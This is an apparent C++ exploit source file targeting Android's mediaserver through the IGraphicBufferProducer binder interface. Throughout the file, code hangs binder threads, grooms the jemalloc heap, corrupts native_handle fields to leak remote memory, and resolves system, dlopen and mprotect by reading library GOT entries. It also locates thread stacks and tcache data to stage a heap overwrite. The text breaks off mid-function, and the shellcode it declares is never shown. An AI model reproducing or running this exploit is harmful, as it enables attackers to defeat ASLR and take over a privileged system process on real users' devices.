#define private public
#define protected public
#include <binder/Binder.h>
#include <binder/IBinder.h>
#include <binder/IServiceManager.h>
#include <binder/Parcel.h>
#include <binder/ProcessState.h>
#include <binder/TextOutput.h>
#include <binder/IPCThreadState.h>
#include <cutils/ashmem.h>
#include <fcntl.h>
#include <getopt.h>
#include <gui/SurfaceComposerClient.h>
#include <gui/Surface.h>
#include <ui/Fence.h>
#include <ui/GraphicBuffer.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <gui/BufferQueueProducer.h>
#include <signal.h>
#include <string>
#include <iostream>

#include <gui/ISurfaceComposer.h>
#include <gui/BufferQueue.h>
#include <gui/CpuConsumer.h>
#define JEMALLOC_H_TYPES
#include "jemalloc/internal/qr.h"
#include "jemalloc/internal/ql.h"
#include "jemalloc/internal/arena.h"
#define JEMALLOC_H_STRUCTS
#include "jemalloc/internal/stats.h"
#include "jemalloc/internal/tcache.h"
#undef JEMALLOC_H_STRUCTS
#undef JEMALLOC_H_TYPES
#include <media/IMediaRecorder.h>
#include <media/IMediaPlayerService.h>
#include "../bbshell/bbshell.h"

#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "exploit", __VA_ARGS__)
using namespace android;

extern int getGOTOffset(const char * module_name,const char * symbol_name,int *memcpyOffset);
extern unsigned int getOffset(const char *moduleName,const char *funcName);
void shell_main();
void *get_shellcode(uint32_t *len);
void *get_so_buffer(const char *so_name);

namespace threadsignal{
    void thread_exit_handler(int /*sig*/)
    { 
        pthread_exit((void*)-2);
    }
    void setHandler(){
        struct sigaction actions;
        memset(&actions, 0, sizeof(actions)); 
        sigemptyset(&actions.sa_mask);
        actions.sa_flags = 0; 
        actions.sa_handler = thread_exit_handler;
        sigaction(SIGUSR1,&actions,NULL);
    }
}
namespace pingserver{
    struct args_t{
        sp<IBinder> *binder;
        bool isSetHandler;
    };
    void *ping(void *args){
        struct args_t *theArgs = (struct args_t *)args;
        threadsignal::setHandler();
        sp<IBinder> *binder = theArgs->binder;
        theArgs->isSetHandler=true;
        (*binder)->pingBinder();
        return NULL;
    }
    bool isAllBinderThreadHang(sp<IBinder> binder){
        pthread_t t;
        struct args_t args; 
        args.binder=&binder;
        args.isSetHandler=false;
        pthread_create(&t, NULL, ping, (void *)&args );
        while(!args.isSetHandler){
            sleep(0.2);
        }
        sleep(1);
        pthread_kill(t,SIGUSR1);
        void *ret;
        pthread_join(t,&ret);
        return ret==(void*)-2?true:false;
    }
}

namespace threadcontrol{
    sp<IMediaRecorder> recorder;
    sp<IGraphicBufferProducer> producer;
    pthread_t t[20];
    void initGloble(){
        sp<IServiceManager> sm = defaultServiceManager();
        if (sm == NULL) {
            aerr << "service: Unable to get default service manager!" << endl;
            exit(-1);
        }
        String16 name = String16("media.player"); 
        aout<<name<<endl;
        sp<IBinder> service = sm->checkService(name);
        // String16 ifName = get_interface_name(service);
        sp<IMediaPlayerService> player = interface_cast<IMediaPlayerService>(service);

        recorder = player->createMediaRecorder();
        const char *fileName = "/sdcard/forHangThreads.mp4";
        int fd = open(fileName, O_RDWR | O_CREAT, 0744);
        recorder->setVideoSource(2);
        recorder->setOutputFile(fd, 0, 0);
        recorder->setOutputFormat(0);
        recorder->init();
        recorder->prepare();
        recorder->start();
        producer = recorder->querySurfaceMediaSource();
        producer->setBufferCount(6);
    }
    void init(){
        initGloble();
    }
    void uninitGloble(){
        recorder = NULL;
        producer = NULL;
    }
    void *attach(void * args){
        int newSlot = -1;
        sp<GraphicBuffer> bf = new GraphicBuffer(3,3,1,3);
        int threadnum = (int)args;
        int count=1;
        if(threadnum==0)
            count=7;
        for(int i=0;i<count;i++){
            status_t status = producer->attachBuffer(&newSlot,bf); 
            if(status!=0){
                aout<<"attach Buffer "<<newSlot<<" failed with "<<status<<endl;
            }/*else
               aout<<"attach buffer "<<newSlot<<" successfully"<<endl;*/
        }
        return NULL;
    }
    int resumeBinderThreads(){

        aout<<"called resumeBinderThreads"<<endl;
        //uninitGloble();
        sp<Fence> fence = new Fence();
        for(int i=0;i<7;i++){
            producer->cancelBuffer(i,fence);
        }
        for(int i=0;i<40;i++){
            for(int j=0;j<7;j++){
                producer->cancelBuffer(j,fence);
            }
        }
        void *retval = NULL;
        for(int i=0;i<16;i++)
            pthread_join(t[i],&retval);
        return 0;
    }

    int suspendBinderThreads(){

        //initGloble();
        aout<<"called suspendBinderThreads"<<endl;
        pthread_create(&t[0], NULL, attach, (void*)0 );
        sleep(1);
        for(int i=1;i<16;i++)
            pthread_create(&t[i], NULL, attach, (void*)i );
        sleep(0.2);
        /*if(pingserver::isAllBinderThreadHang(producer->asBinder())){
          aout<<"++++++++++++dead lock+++++++++++"<<endl;
          resumeBinderThreads();
          sleep(2);
          suspendBinderThreads();
          }else
          aout<<"ping ok"<<endl;*/
        return 0;
    }
} 
namespace threadcontrol2{ 
    sp<ISurfaceComposer> composer;
    sp<IGraphicBufferProducer> producer;
    sp<IBinder> display;
    typedef status_t (*ONTRANSACT)(BnGraphicBufferProducer *pthis,uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags);
    ONTRANSACT originalOnTransact = NULL; 
    volatile bool endLoop = true;

    status_t onTransact(BnGraphicBufferProducer *pthis,uint32_t code, const Parcel& data, Parcel* reply, uint32_t flags){

        status_t ret = originalOnTransact(pthis,code,data,reply,flags);
        while(!endLoop){
            sleep(0.5);
        }
        return ret;
    }

    void *capscreen(void *)
    {
        printf("thread started\n");
        sleep(1);
        status_t err = composer->captureScreen(display, producer,Rect(600,800), 0,0,0,-1UL,false,ISurfaceComposer::eRotateNone );
        if (err != NO_ERROR) {
            fprintf(stderr, "screen capture failed: %s\n", strerror(-err));
        }

        printf("screen capture success\n");
        return NULL;
    }
    int resumeBinderThreads()
    {
        aout<<"called resumeBinderThreads"<<endl;
        endLoop = true;
        sleep(2);
        return 0;
    }

    void init()
    {

        const String16 name("SurfaceFlinger");
        getService(name, &composer);

        uint32_t w, h;
        PixelFormat f;
        display=(composer->getBuiltInDisplay(ISurfaceComposer::eDisplayIdMain));
        sp<IGraphicBufferConsumer> consumer;
        BufferQueue::createBufferQueue(&producer, &consumer);
        BnGraphicBufferProducer *p =   static_cast<BnGraphicBufferProducer*>(producer->asBinder()->localBinder());
        int onTranAddress = *((int*)p+1)+16*4;
        mprotect((void*)(onTranAddress&0xfffff000),4096,PROT_READ|PROT_WRITE);
        originalOnTransact = (ONTRANSACT)*(int*)onTranAddress;
        *(int*)onTranAddress = (int)&onTransact;
        sp<CpuConsumer> cpuConsumer = new CpuConsumer(consumer, 1);


    }
    int suspendBinderThreads()
    {

        endLoop = false;

#define threadCount 4
        pthread_t t[threadCount];
        for(uint32_t i = 0; i < threadCount; i++){
            pthread_create( &t[i], NULL, capscreen, (void *)NULL );
        }
        sleep(1.5);
        if(pingserver::isAllBinderThreadHang(producer->asBinder())){
            aout<<"++++++++++++dead lock+++++++++++"<<endl;
            resumeBinderThreads();
            sleep(2);
            suspendBinderThreads();
        }else
            aout<<"ping ok"<<endl;
        return 0;
    }
}

sp<IGraphicBufferProducer> g_producer;
Parcel *requestBuffer(int bufferIdx,sp<IGraphicBufferProducer> producer)
{
    sp<IBinder> binder= producer->asBinder();
    Parcel data;
    Parcel *reply = new Parcel();
    data.writeInterfaceToken(String16("android.gui.IGraphicBufferProducer"));
    data.writeInt32(bufferIdx);

    status_t status =binder->transact(1, data, reply,0);
    for(int i=0;i<10;i++)
        if(status!=0){
            delete reply;
            reply = new Parcel();
            aout<<"transact failed with "<<status<<" retry transact"<<endl;
            status = binder->transact(1, data, reply,0);
        }
    return reply;
}

void prepareData(Parcel &data,int numFds,int numInts)
{

    //aout<<"---------------"<<numFds<<":"<<numInts<<"========"<<endl;
    String16 ifName = IGraphicBufferProducer::descriptor;
    data.writeInterfaceToken(ifName);
    data.writeInt32(1);//status flags
    data.writeInt32(numFds);//-23
    data.writeInt32(numInts);//37

}

Parcel *getRemoteMemory(int newSlot,__attribute__((unused)) int numFds,__attribute__((unused)) int numInts, GraphicBuffer *findedBuffer,buffer_handle_t handle)
{

    sp<IBinder> binder= g_producer->asBinder();
    Parcel data,unusedReply;
    prepareData(data,-35,64);
    GraphicBuffer *exploitBuffer = (GraphicBuffer*)malloc(sizeof(GraphicBuffer));
    memcpy(exploitBuffer,findedBuffer,sizeof(GraphicBuffer));
    exploitBuffer->handle = handle;
    data.write(exploitBuffer,sizeof(GraphicBuffer));
    int *p = (int*)exploitBuffer;
    int fill[32]={12,2,12};
    fill[31]=0xcccccccc;
    for(int i=0;i<2;i++)
        data.write(fill,128);

    LOGE("overwrite\n");
    status_t status = binder->transact(12, data, &unusedReply,0);
    for(int i=0;i<10;i++)
        if(status!=0){
            aout<<"transact failed with "<<status<<" retry transact"<<endl;
            status = binder->transact(12, data, &unusedReply,0);
        }
    Parcel *reply = requestBuffer(newSlot,g_producer);
    free(exploitBuffer);

    Parcel data_for_ajust;
    prepareData(data_for_ajust,0,29);
    data_for_ajust.write(fill,128);
    LOGE("adust point\n");
    binder->transact(12, data_for_ajust, &unusedReply,0);

    return reply;
}
int getSystemFuncAddress(const Parcel *libui)
{

    unsigned char *p = (unsigned char*)libui->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libui base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libui->dataSize();
    int memcpyOffset = -1; 
    getGOTOffset("/system/lib/libui.so","memcpy",&memcpyOffset);
    int memcpyAddress = *(int *)(p+memcpyOffset-(0x18+12+0x34*4));
    //raise(SIGINT);
    aout<<"memcpy in mediaserver is "<<(void*)memcpyAddress<<endl;
    int memcpyOffsetFromBase = getOffset("libc.so","memcpy");
    int systemOffsetFromBase = getOffset("libc.so","system");

    aout<<memcpyOffsetFromBase<<" "<<systemOffsetFromBase<<endl;
    int systemAddressInSurfaceflinger = memcpyAddress-memcpyOffsetFromBase+systemOffsetFromBase;

    aout<<"system in mediaserver is "<<(void*)systemAddressInSurfaceflinger<<endl;
    return systemAddressInSurfaceflinger;
}

int getDlopenFuncAddress(const Parcel *libc)
{

    unsigned char *p = (unsigned char*)libc->data()+13*4;//the first 13 words belong to GraphicBuffer
    //p point to libc base + (0x18+12+0x34*4), 0x18 for getting native_handle,12 size of native handle,0x34 is value of numFds.
    size_t leakedSize = libc->dataSize();
    int dlopenOffset = -1; 
    getGOTOffset("/system/lib/libc.so","dlopen",&dlopenOffset);
    //0xb6f643e4 <_DYNAMIC+4>:    0x00068650  0x00000002  0x00001348  0x00000017
    int dlopenAddress = *(int *)(p+dlopenOffset-(0x683e4+12+0x2*4));
    //raise(SIGINT);
    aout<<"dlopen in mediaserver is "<<(void*)dlopenAddress<<endl;
    return dlopenAddress;
}

void *getStackBase(const Parcel *searchedParcel){
    uint32_t size = searchedParcel->dataSize();
    aout<<"search stack "<<(void*)size<<endl;
    for(uint32_t j=12;j<size-4;j++){

        uint32_t *p = (uint32_t*)((uint32_t)searchedParcel->data()+j);

        if(p[0]==600&&p[1]==800)
        {
            if( ((p[-1]+0x1000)&0xfffff000) == ((p[-3]+0x1000)&0xfffff000) )
            {
                void *pStackBase = (void*)((p[-1]+0x1000)&0xfffff000);
                aout<<"-----------find stack address at "<<pStackBase<<"-----------"<<endl;
            }
        }

    }
    return NULL;
}

unsigned int stack[][3]={
    {0xae157000,0xae254000,2706},
    {0xae25b000,0xae358000,2705},
    {0xae35d000,0xae45a000,2704},
    {0xae45f000,0xae55c000,2703},
    {0xae561000,0xae65e000,2702},
    {0xae663000,0xae760000,2701},
    {0xae765000,0xae862000,2700},
    {0xae867000,0xae964000,2699},
    {0xae969000,0xaea66000,2698},
    {0xaea6b000,0xaeb68000,2697},
    {0xaeb6d000,0xaec6a000,2696},
    {0xaec6f000,0xaed6c000,2695},
    {0xaed71000,0xaee6e000,2691},
    {0xb4801000,0xb48fe000,2513},
    {0xb48ff000,0xb49fc000,2512},
    {0xb49fd000,0xb4afa000,2511},
    {0xb4d03000,0xb4e00000,2507},
    {0xb4e03000,0xb4f00000,2506},
    {0xb5103000,0xb5200000,2505},
    {0xb5505000,0xb5602000,2504},
    {0xb5603000,0xb5700000,2503},
    {0xb5be7000,0xb5ce4000,2501},
    {0xb5ce5000,0xb5de2000,2500},
    {0xb5de3000,0xb5ee0000,2499},
    {0xbe994000,0xbe9b5000,},
};

void *heapFengShui(){

    sp<IGraphicBufferProducer> producer = g_producer;
    sp<IBinder> binder= producer->asBinder();
    sp<GraphicBuffer> bf = new GraphicBuffer(100,100,1,3);
    int newSlot=-1;
    status_t status = 0;
    *(int*)&(bf->handle->numFds)=0;
    *(int*)&(bf->handle->numInts)=29;//29
    //native handle won't free as it's invalid
    for(int i=0;i<35;i++){
        status = producer->attachBuffer(&newSlot,bf); 
        if(status!=0){
            printf("transact fail with %d",status);
        }
        status = producer->detachBuffer(newSlot); 
        if(status!=0){
            printf("detachBuffer fail with %d",status);
        }
    }
    return NULL;
}

int do_work(int round,int *pipein)
{
    const uint32_t offsetFromIncRefToLibuibase = 0x6449;
    uint32_t pChunkRemote = 0;
    uint32_t pTcacheRemote = 0;
    uint32_t gap = 0;
    aout<<"i'm started"<<endl;
    aout<<"sizeof(GraphicBuffer) is "<<sizeof(GraphicBuffer)<<endl;//128
    aout<<"sizeof(BufferQueueProducer) is "<<sizeof(BufferQueueProducer)<<endl;//44

    sp<ProcessState> proc(ProcessState::self());
    proc->startThreadPool();

    //prepare exploit data
    Parcel data,reply;
    if(round==1)
        prepareData(data,0,0x3ffffff0);
    //prepareData(data,1,28);
    else
        prepareData(data,-23,37);

#define BUFFERLEN 0xfaffc
    int buffer[BUFFERLEN/4];
    for(size_t i=0;i<BUFFERLEN;i+=4)
        buffer[i/4]=0xcccccccc;
    //控制返回内容多少
    buffer[1]=0;   //numFds
    buffer[2]=0x10000;//0x1ffff;   //numInts
    data.write(buffer,BUFFERLEN);

    status_t status = 0;


    //get IGraphicBufferProducer exported by media_server
    sp<IServiceManager> sm = defaultServiceManager();
    if (sm == NULL) {
        aerr << "service: Unable to get default service manager!" << endl;
        exit(-1);
    }
    sp<IGraphicBufferProducer> producer;
    sp<IMediaRecorder> recorder;
    String16 name = String16("media.player"); 
    aout<<name<<endl;
    sp<IBinder> service = sm->checkService(name);
    if(service.get()==NULL){
        aerr<< "get media.player service failed\n"<<endl;
        return -1;
    }
    sp<IMediaPlayerService> player = interface_cast<IMediaPlayerService>(service);
    recorder = player->createMediaRecorder();
    const char *fileName = "/sdcard/forexploit.mp4";//;
    int fd = open(fileName, O_RDWR | O_CREAT, 0744);
    recorder->setVideoSource(2);
    recorder->setOutputFile(fd, 0, 0);
    recorder->setOutputFormat(0);
    recorder->init();
    recorder->prepare();
    recorder->start();
    producer = recorder->querySurfaceMediaSource();
    producer->setBufferCount(64);
    g_producer = producer;

    bool bIsHeapStable = false;
    GraphicBuffer *findedBuffer = NULL;
    void * findedNativeHandle = NULL;
    void * incRef = NULL;
    void * stackBase = NULL;
    int offset = 0;
    int modifyedGraphicBuffer = 0;
    sp<IBinder> binder = producer->asBinder();
    //使medaiserver崩溃退出
    if(round==1){
        binder->transact(12, data, &reply,0);
        return 0;
    }
    srand(time(NULL));
    threadcontrol::init();
    uint32_t found_pthread_count = 0;
    uint32_t saved_max_tid = 0;
    //外层主循环，如果堆一直不稳定，循环80次结束,堆稳定状态是指可以在被修改的native_handle后找到多个连续的GraphicBuffer
    for(int k=1;k<80&&bIsHeapStable==false;k++)//loop to select a statable heap status 
    {
        int newSlot=-1;
        const unsigned int buffercount = 3;//rand()%5;
        int randomWidth=rand()%1000;
        int randomHeight=rand()%1000;
        threadcontrol::suspendBinderThreads();
        Parcel *replyBuffer = NULL;

        //此循环是为了成功改写一个native_handle,判断条件是从mediaserver返回的大小大于136
        for(int m=0;m<20;m++){
            //hope to fill holes 
            sp<GraphicBuffer> pbuffer = new GraphicBuffer(3,3,1,3);
            int slot = 0;
            const int preFilledBuffers = rand()%30;
            //将离散的内存洞填满
            for(int i=0;i<preFilledBuffers;i++){
                status = producer->attachBuffer(&slot,pbuffer); 
                if(status!=0){
                    aout<<"attach Buffer "<<slot<<" failed"<<endl;
                    aout<<"mediaserver maybe crash waiting for reboot"<<endl;
                    exit(-1);
                }
            }
            //在远程堆上分配多个GraphicBuffer和nativehandle,希望GraphicBuffer会分配在nativehandle的相对高地址
            heapFengShui();
            sp<GraphicBuffer> bf = new GraphicBuffer(randomWidth,randomHeight,1,3);
            for(unsigned int i=0;i<buffercount;i++){
                status = producer->attachBuffer(&newSlot,bf); 
                if(status!=0)
                    aout<<"attach Buffer "<<newSlot<<" failed"<<endl;

            }
            //aout<<"start boom"<<endl;
            //修改前一个native_handle 的nFDs 和 nInts
            binder->transact(12, data, &reply,0);
            if(round==1){//如果round是1，上述transact后mediaserver应该已经重启了
                aout<<"crash"<<endl;
                return 0;
            }

            //从mediaserver返回堆内容
            replyBuffer = requestBuffer(newSlot,producer);
            aout<<"slot "<<newSlot<<" return size is "<<replyBuffer->dataSize()<<endl;
            //判断native_handle是否被成功修改了
            if(replyBuffer->dataSize()<=136){
                if(m!=19){
                    delete replyBuffer;
                    for(int i=0;i<=newSlot;i++){
                        status = producer->detachBuffer(i);
                        if (status!=0){
                            aout<<"detach buffer "<<i<<"failed"<<endl;
                            aout<<"mediaserver maybe crash waiting for reboot"<<endl;
                            exit(-1);
                        }

                    }
                }

            }else
                break;//native_handle已经被成功修改

        }
        if(replyBuffer->dataSize()!=136)
        {
            unsigned int *p = (unsigned int*)replyBuffer->data();
            uint32_t findedBufferCount=0;
            bool isFirstcc = true;
            //find stack address in heap
            for(size_t i=5;i<replyBuffer->dataSize()/4-5;i++){
                /*for(size_t j=0;j<sizeof(stack)/sizeof(stack[0]);j++)
                  if(p[i]>=stack[j][0]&&p[i]<=stack[j][1]){   
                  printf("0x%.8x at thread %d,%d\n",p[i],stack[j][2],i);
                //raise(SIGINT);
                int pos=i-40;
                for(int i=pos;i<80+pos;i++){
                if(i%4==0)
                printf("\n%.8x:",i);
                printf("%.8x ",p[i]);
                }
                printf("\n");

                }
                continue;*/

                //find stack base in pthread_internal_t
                //0xb652ec8c:   0xb424a080  0xb3b7c080  0x00000b58  0x00000a53
                //0xb652ec9c:   0xae8dcdb0  0x00000001  0xae7df000  0x000fe000
                //0xb652ecac:   0x00001000  0x00000000  0x00000000  0x00000000
                //0xb652ecbc:   0xb6e4700d  0xb3d48960  0x00000000  0xae7dd000
                //0xb652eccc:   0x00000001  0x00000000  0x00000000  0x00000000
                //0xb652ecdc:   0x00000000  0x00000000  0x00000000  0x00000000
                //binder thread start_routine is thread_data_t::trampoline end with 0x00d such as 0xb6e8200d-0xb6e72000

                if(p[i]==0xfe000&&p[i+1]==0x1000&&(p[i+5]&0xfff)==0x00d){
                    if(p[i-5]>saved_max_tid){
                        stackBase = (void*)(p[i-1]+p[i]); 
                        saved_max_tid = p[i-5];
                    }
                    int pos=i-7;
                    for(int i=pos;i<40+pos;i++){
                        if((i-pos)%4==0)
                            printf("\n%.8x:",i-pos);
                        printf("0x%.8x ",p[i]);
                    }
                    printf("\n");
                    found_pthread_count ++;
                }
            }
            //we must first find stack address of binder threads
            //找到多个栈基址，tid最大的那个大概率是处于挂起状态的线程
            if(found_pthread_count<4)
            {
                aout<<"haven't found stack base "<<found_pthread_count<<endl;
                threadcontrol::resumeBinderThreads();
                delete replyBuffer;
                for(int i=0;i<=newSlot;i++){
                    status = producer->detachBuffer(i);
                    if (status!=0)
                        aout<<"detach buffer "<<i<<"failed"<<endl;

                }
                continue;
            }
            aout<<"found binder tid is"<<saved_max_tid<<" stackbase at "<<stackBase<<endl;
            //判断当前堆是否处于稳定状态，native_handle后有多个连续的GraphicBuffer
            for(size_t j=4;j<replyBuffer->dataSize()/4;j++)
            {
                //find the address of libui.so 
                if(p[j]==0x5f626672)//'_','b','f','r'
                {
                    findedBuffer = (GraphicBuffer*)(&p[j]-2);
                    //aout<<"find GraphicBuffer at "<<j<<endl;
                    //aout<<"version is:"<<findedBuffer->common.version<<" incRef is:"<<(void *)findedBuffer->common.incRef<<"heap address is:"<<findedBuffer->handle<<endl;
                    //aout<<"width is:"<<findedBuffer->width<<"height is:"<<findedBuffer->height<<endl;
                    if(findedBuffer->width==randomWidth&&findedBuffer->height==randomHeight)
                        findedBufferCount++;
                    else if(findedBufferCount>0)//需要连续内存
                    {
                        aout<<"not contigous memeory"<<endl;
                        break;
                    }
                    if(findedBufferCount==buffercount){
                        incRef = (void*)(findedBuffer->common.incRef);
                        pChunkRemote = (uint32_t)findedBuffer->handle&0xfff00000;
                        gap = (uint32_t)findedBuffer->handle&0xfffff;
                        pTcacheRemote = pChunkRemote+0x1000;
                        aout<<"chunk at "<<(void*)pChunkRemote<<",tcache at "<<(void*)pTcacheRemote<<",gap is "<<(void*)gap<<endl;
                        break;
                    }
                } 
                if(p[j]==0xcccccccc&&isFirstcc){
                    findedNativeHandle = (void*)(&p[j]-3);
                    offset = j-3;
                    isFirstcc = false;
                }
            }

            if(findedBufferCount == buffercount){
                aout<<"get the stable heap status"<<endl;
                bIsHeapStable = true;
            }else
                aout<<findedBufferCount<<" heap is not in stable status, retry"<<endl; 
            //aout<<*replyBuffer<<endl;
        }

        if(bIsHeapStable==false)
            for(int i=0;i<=newSlot;i++){
                status = producer->detachBuffer(i);
                if (status!=0)
                    aout<<"detach buffer "<<i<<"failed"<<endl;

            }

        if(bIsHeapStable){//堆处于稳定状态了，开始泄漏地址

            //force tcache cache some point
            //在mediaserver中分配2个特定大小的堆块，tcache中的对于次大小的tcache_bin_t 会记录分配的块的多岁，用于找到当前线程对应的tcache.
            LOGE("adjust tcache ncached\n");
            for(int i=0;i<2;i++){
                Parcel data_for_tcache,reply_for_tcache;
                prepareData(data_for_tcache,0,317);
                int fillbuffer[317];
                data_for_tcache.write((void*)fillbuffer,317*4);
                binder->transact(12, data_for_tcache, &reply_for_tcache,0);
            }
            //print some infomation
            aout<<(void*)findedBuffer<<":"<<(void*)findedNativeHandle<<":"<<(void*)(findedBuffer->handle)<<endl;
            printf("native handle memory ");
            for(int *p=(int*)findedNativeHandle;p<(int*)findedNativeHandle+4;p++)
                printf("0x%.8x ",(unsigned int)*p);
            printf("\nfinded Buffer Memmory ");
            for(int *p=(int*)findedBuffer;p<(int*)findedBuffer+4;p++)
                printf("0x%.8x ",(unsigned int)*p);
            printf("\n");
            //得到包含被修改的native_handle指针的GraphicBuffer的远程地址
            modifyedGraphicBuffer = ((int)findedBuffer-(int)findedNativeHandle)+(int)(findedBuffer->handle);
            aout<<"native handle at "<<findedBuffer->handle<<" relative offset is "<<offset<<endl;
            aout<<"find modifyedGraphicBuffer at "<<(void*)modifyedGraphicBuffer<<endl;
            //leak memcpy address from the GOT of libui
            GraphicBuffer *exploitBuffer = (GraphicBuffer*)malloc(sizeof(GraphicBuffer));
            //从incRef中计算出libuiBase的基址
            unsigned int libuiBase = (unsigned int)(incRef)-0x6449;
            //在libui模块中找一个fakehandle，将libuiBase+0x18的位置当成一个nativehandle
            unsigned int fakedhandle = libuiBase+0x18;
            aout<<"libuiBase "<<(void*)libuiBase<<" fakehandle "<<(void*)fakedhandle<<endl;
            //修改GraphicBuffer中native_handle的指针,使其指向fakehandle，从而泄漏出libui的GOT表
            Parcel *libuiContent = getRemoteMemory(newSlot,-35,64,findedBuffer,(buffer_handle_t)fakedhandle);
            if(libuiContent->errorCheck()!=0){
                aout<<"get got of libui failed"<<endl;
                delete libuiContent;
                exit(-1);
            }
            aout<<libuiContent->dataSize()<<endl;
            //从libui的GOT表中的到system的地址
            int systemAddress = getSystemFuncAddress(libuiContent);
            delete libuiContent;

            //get dlopen addres from got of libc
            //泄漏libc的GOT得到dlopen地址
            unsigned int libcbase = (unsigned int)systemAddress-getOffset("libc.so","system")-1;
            aout<<"libc base is "<<(void*)libcbase<<endl;
            Parcel *libcContent = getRemoteMemory(newSlot,-67,96,findedBuffer,(buffer_handle_t)(libcbase+0x683e4));
            aout<<"leaked libc size "<<libcContent->dataSize()<<endl;
            int dlopenAddress = getDlopenFuncAddress(libcContent);
            delete libcContent;
            //get mprotect address 
            void *mprotect_address = (void *)(libcbase+getOffset("libc.so","mprotect"));
            aout<<"mprotect address is "<<mprotect_address<<endl;


            {
                aout<<"chunk is at "<<(void*)pChunkRemote<<endl;
                //泄漏该堆所在的chunk 的内容，因为没有合适的fakehandle，得分两部泄漏，先泄漏一个页，然后在这个也中搜索一个fakehandle泄漏chunk中其余内容
                Parcel *pReply = getRemoteMemory(newSlot,-99,128,findedBuffer,(buffer_handle_t)(pChunkRemote+7));
                if(pReply->errorCheck()!=0){
                    aout<<"leak large size of heap memory failed"<<endl;
                    delete pReply;
                    goto _fail;
                }
                uint32_t *p = (uint32_t*)pReply->data();
                uint32_t nFds = p[11];
                uint32_t nInts =p[12];
                aout<<"return data len "<<pReply->dataSize()<<endl;
                aout<<"return pChunkRemote nFds is "<<p[11]<<" nInts is "<<p[12]<<endl;
                uint32_t *pnumInts = (uint32_t*)&p[13];
                native_handle_t *pSearchHandle = NULL;
                native_handle_t *pMaxHandle = NULL;
                //search in the first 1KB to find a native handle
                //搜索前1KB找到一个合适的fakehanle
                for(size_t i=0;i<nInts*4&&i<0x1000-7-12-4*nFds;i++){
                    pSearchHandle = (native_handle_t *)((int)pnumInts+i);
                    if(pSearchHandle->numFds>=0&&pSearchHandle->numFds<=0xd00&&pSearchHandle->numInts>0x8000&&pSearchHandle->numInts<0x18fff)
                    {
                        //ensure the first leaked address smaller than chunk+1k
                        if(7+12+4*pSearchHandle->numFds>0x1000)
                        {
                            aout<<"can't leak tcache from beginnin, retry"<<endl;
                            continue;
                        }

                        if(pMaxHandle==NULL||pMaxHandle->numInts<pSearchHandle->numInts)
                            pMaxHandle = pSearchHandle;
                    }
                }
                if(pMaxHandle==NULL)
                {
                    aout<<"++++++++++++search handle failed++++++++++++++\n";
                    goto _fail;

                }
                uint32_t offsetFromPreviousHandle = (uint32_t)pMaxHandle-(uint32_t)pnumInts;
                native_handle_t * remoteHandle = (native_handle_t *)(pChunkRemote+7+4*nFds+12+offsetFromPreviousHandle);
                if((uint32_t)remoteHandle>(uint32_t)pChunkRemote+0x1000)//exceed tcache
                {
                    aout<<"exceed tcache"<<endl;
                    goto _fail;

                }
                aout<<"selected index of numInts is "<<(void*)(offsetFromPreviousHandle)<<endl;
                aout<<"remote handle address is "<<(void*)remoteHandle<<endl;
                aout<<"numFds is"<<(void*)pMaxHandle->numFds<<" numInts is "<<(void*)(pMaxHandle->numInts)<<endl;
                delete pReply;

                //leak large size of heap include tcache
                //通过搜索得到的fakehandle泄漏chunk中其余内容，主要是为了获得tcache中指针表的内容
                Parcel *pHeap = getRemoteMemory(newSlot,-131,160,findedBuffer,(buffer_handle_t)remoteHandle);
                if(pHeap->errorCheck()!=0){
                    aout<<"leak large size of heap memory failed"<<endl;
                    delete pHeap;
                    goto _fail;
                }
                aout<<"return heap size is "<<(void*)pHeap->dataSize()<<endl;
                uint32_t startOfLeakedHeap = (uint32_t)pHeap->data()+13*4;
                uint32_t leftBytes = (uint32_t)pChunkRemote+0x1000-(uint32_t)remoteHandle-12-(uint32_t)pMaxHandle->numFds*4;
                if(leftBytes>0x1000)
                {   
                    aout<<"pChunkRemote is "<<(void*)pChunkRemote<<"remoteHandle is "<<remoteHandle<<"numFds "<<(void*)pMaxHandle->numFds<<endl;
                    delete pHeap;
                    aout<<"logical error"<<endl;
                    goto _fail;
                    //exit(-1);
                }
                //搜索tcache指针表
                tcache_t * pTcache = (tcache_t*)(startOfLeakedHeap+leftBytes);
                uint32_t leakedSizeFromTcache = pHeap->dataSize()-13*4-leftBytes;
                tcache_bin_t *binForSize128 = &(pTcache->tbins[24]);
                aout<<"avail is "<<(void*)binForSize128->avail<<" ncached is "<<binForSize128->ncached<<endl;
                bool correct_tbins=true;
                if(binForSize128->ncached<2||binForSize128->ncached>200||binForSize128->lg_fill_div!=1){
                    correct_tbins=false;
                    aout<<"ncached is "<<binForSize128->ncached<<" lg_fill_div is "<<binForSize128->lg_fill_div<<endl;
                    if(binForSize128->ncached==0&&binForSize128->lg_fill_div==1){//there maybe more than 1 tcache in same chunk
                        uint32_t pSecondTcacheRemote = *(uint32_t*)pTcache;
                        if( pSecondTcacheRemote != pTcacheRemote){
                            tcache_t *pSecondTcache = (tcache_t*)((uint32_t)pTcache+(pSecondTcacheRemote-pTcacheRemote));
                            binForSize128 = &(pSecondTcache->tbins[24]);
                            aout<<"avail is "<<(void*)binForSize128->avail<<" ncached is "<<binForSize128->ncached<<endl;
                            if(binForSize128->ncached<2||binForSize128->ncached>200||binForSize128->lg_fill_div!=1){
                                aout<<"ncached is "<<binForSize128->ncached<<" lg_fill_div is "<<binForSize128->lg_fill_div<<endl;
                            }else{
                                correct_tbins=true;
                            }
                        }
                    }
                    if(false==correct_tbins){
                        aout<<"++++++++++++invalid tbins,retry++++++++++++"<<endl;
                        delete pHeap;
                        goto _fail;
                    }
                }
                uint32_t offsetToNextAllocPoint = (uint32_t)(binForSize128->avail)+(binForSize128->ncached-1)*4-pChunkRemote-0x1000;
                uint32_t overwritedHeapSize = ((modifyedGraphicBuffer&0x000fffff)-0x1000)+1*128+3*4;
                if(leakedSizeFromTcache<overwritedHeapSize){
                    aout<<"leaked size is smaller than the size to overwrite heap"<<endl;
                    //maybe crash, but have a try
                    delete pHeap;
                    goto _fail;
                }
                char * modifiedHeap = (char*)malloc(overwritedHeapSize);
                memcpy(modifiedHeap,(void*)pTcache,overwritedHeapSize);
